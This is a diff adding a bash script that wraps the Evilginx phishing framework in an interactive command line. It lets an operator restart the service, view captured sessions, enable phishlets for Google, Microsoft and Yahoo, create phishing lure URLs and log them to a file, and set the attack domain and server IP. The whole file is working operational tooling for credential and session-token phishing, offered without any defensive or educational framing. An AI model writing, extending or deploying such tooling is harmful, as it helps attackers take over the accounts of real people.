@@ -1,0 +1,181 @@
+#!/bin/bash
+# Evilginx CLI - Interactive Command Tool (Like Fpages)
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+NC='\033[0m'
+
+show_help() {
+    echo ""
+    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
+    echo -e "${GREEN}Evilginx Commands:${NC}"
+    echo ""
+    echo -e "${YELLOW}Service:${NC}"
+    echo -e "  ${GREEN}restart${NC}        - Restart evilginx service"
+    echo -e "  ${GREEN}status${NC}         - Show service status"
+    echo -e "  ${GREEN}sessions${NC}       - Show captured sessions"
+    echo -e "  ${GREEN}traffic${NC}        - Show traffic statistics"
+    echo ""
+    echo -e "${YELLOW}Phishlets:${NC}"
+    echo -e "  ${GREEN}phishlets${NC}      - List all phishlets"
+    echo -e "  ${GREEN}enable <name>${NC}  - Enable phishlet (google/microsoft/yahoo)"
+    echo -e "  ${GREEN}disable <name>${NC} - Disable phishlet"
+    echo ""
+    echo -e "${YELLOW}Lures:${NC}"
+    echo -e "  ${GREEN}lures create <name>${NC} - Create new phishing URL"
+    echo -e "  ${GREEN}lures list${NC}          - List all lures"
+    echo -e "  ${GREEN}lures url <id>${NC}      - Get URL for lure ID"
+    echo ""
+    echo -e "${YELLOW}Config:${NC}"
+    echo -e "  ${GREEN}set domain <domain>${NC}   - Set domain"
+    echo -e "  ${GREEN}set ip <ip>${NC}           - Set VPS IP"
+    echo ""
+    echo -e "${YELLOW}Other:${NC}"
+    echo -e "  ${GREEN}help${NC}            - Show this help"
+    echo -e "  ${GREEN}exit${NC}            - Exit CLI"
+    echo ""
+    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
+}
+
+restart() {
+    sudo systemctl restart evilginx
+    echo -e "${GREEN}[✓] Evilginx restarted${NC}"
+}
+
+status() {
+    if systemctl is-active --quiet evilginx; then
+        echo -e "${GREEN}[✓] Evilginx is RUNNING${NC}"
+        PID=$(pgrep -f evilginx | head -1)
+        echo -e "  PID: $PID"
+    else
+        echo -e "${RED}[✗] Evilginx is STOPPED${NC}"
+    fi
+}
+
+traffic() {
+    echo -e "${BLUE}[*] Traffic Statistics:${NC}"
+    if [[ -f "/opt/evilginx/evilginx.db" ]]; then
+        TOTAL=$(sudo sqlite3 /opt/evilginx/evilginx.db "SELECT COUNT(*) FROM sessions;" 2>/dev/null || echo "0")
+        echo -e "  ${GREEN}Total Visitors:${NC} $TOTAL"
+    else
+        echo "  No data yet"
+    fi
+}
+
+sessions() {
+    sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets -sessions
+}
+
+phishlets() {
+    sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets -phishlets
+}
+
+enable_phishlet() {
+    echo -e "${BLUE}[*] Enabling $1...${NC}"
+    sudo systemctl stop evilginx
+    sleep 1
+    sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets > /tmp/evilginx.out 2>&1 <<EOF
+phishlets enable $1
+exit
+EOF
+    sudo systemctl start evilginx
+    echo -e "${GREEN}[✓] $1 enabled${NC}"
+}
+
+disable_phishlet() {
+    echo -e "${BLUE}[*] Disabling $1...${NC}"
+    sudo systemctl stop evilginx
+    sleep 1
+    sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets > /tmp/evilginx.out 2>&1 <<EOF
+phishlets disable $1
+exit
+EOF
+    sudo systemctl start evilginx
+    echo -e "${GREEN}[✓] $1 disabled${NC}"
+}
+
+create_lure() {
+    echo -e "${BLUE}[*] Creating lure for $1...${NC}"
+    sudo systemctl stop evilginx
+    sleep 1
+    output=$(sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets <<EOF
+lures create $1
+lures get-url 0
+exit
+EOF
+)
+    url=$(echo "$output" | grep -E "https?://" | head -1)
+    sudo systemctl start evilginx
+    if [[ -n "$url" ]]; then
+        echo -e "${GREEN}[✓] Lure created!${NC}"
+        echo -e "${CYAN}URL: ${url}${NC}"
+        echo "$url" >> /opt/evilginx/lures.txt
+    else
+        echo -e "${RED}[✗] Failed to create lure${NC}"
+    fi
+}
+
+list_lures() {
+    sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets -lures
+}
+
+get_lure_url() {
+    sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets <<EOF
+lures get-url $1
+exit
+EOF
+}
+
+set_domain() {
+    sudo sed -i "s/^domain:.*/domain: $1/" /opt/evilginx/config/config.yaml
+    echo -e "${GREEN}[✓] Domain set to $1${NC}"
+    restart
+}
+
+set_ip() {
+    sudo sed -i "s/^ipv4:.*/ipv4: $1/" /opt/evilginx/config/config.yaml
+    echo -e "${GREEN}[✓] IP set to $1${NC}"
+    restart
+}
+
+# Main loop
+echo -e "${CYAN}Evilginx CLI - Type 'help' for commands${NC}"
+echo ""
+
+while true; do
+    echo -n -e "${GREEN}evilginx> ${NC}"
+    read -r cmd args
+
+    case "$cmd" in
+        "" ) continue ;;
+        help) show_help ;;
+        restart) restart ;;
+        status) status ;;
+        traffic) traffic ;;
+        sessions) sessions ;;
+        phishlets) phishlets ;;
+        enable) enable_phishlet "$args" ;;
+        disable) disable_phishlet "$args" ;;
+        lures) 
+            case "$args" in
+                create*) create_lure "${args#create }" ;;
+                list) list_lures ;;
+                url*) get_lure_url "${args#url }" ;;
+                *) echo "Usage: lures <create|list|url> [name|id]";;
+            esac
+            ;;
+        set)
+            case "$args" in
+                domain*) set_domain "${args#domain }" ;;
+                ip*) set_ip "${args#ip }" ;;
+                *) echo "Usage: set <domain|ip> <value>";;
+            esac
+            ;;
+        exit) echo -e "${GREEN}Goodbye!${NC}"; exit 0 ;;
+        *) echo -e "${RED}Unknown command. Type 'help'${NC}" ;;
+    esac
+    echo ""
+done
